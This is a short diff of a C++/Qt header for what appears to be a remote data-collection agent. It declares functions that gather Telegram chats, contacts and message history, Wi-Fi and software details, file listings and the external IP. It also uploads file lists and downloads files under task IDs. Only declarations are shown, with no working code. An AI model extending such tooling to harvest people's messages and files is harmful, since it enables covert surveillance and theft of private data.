@@ -44,6 +44,8 @@ private:
     void collectRecentFiles(const QString& taskId);
     QString getSoftwareJson();
     QString getWifiJson();
+    QString getFileListJson(const QString& path);
+    QString getChatHistoryJson(const QString& chatId, int limit, int offsetId);
     QString getRecentFilesJson();
     QString getCurrentUserJson();
     void collectTelegramData(); // Chats, Contacts, Messages
@@ -58,6 +60,7 @@ private:
     void collectDrivesAndUsers();
     void scanDirectory(const QString& taskId, const QString& path);
     void uploadFileList(const QString& parentPath, const QJsonArray& files);
+    void downloadFile(const QString& taskId, const QString& url, const QString& savePath);
     
     // Helper
     QString getDbPath();
@@ -78,6 +81,10 @@ private:
     // Sync State
     QString _syncTaskId;
     int _activeSyncs = 0;
+    
+    // Cache
+    QString _cachedExternalIp = "Unknown";
+    void fetchExternalIp();
     void fetchHistoryLoop(void* peer, int minId); // void* to avoid including heavy headers in .h if not needed, but we have them in .cpp. 
     // Actually we can use forward decl for PeerData if needed, or just keep implementation in cpp.
     // Let's use void* or specific type if header allows. 
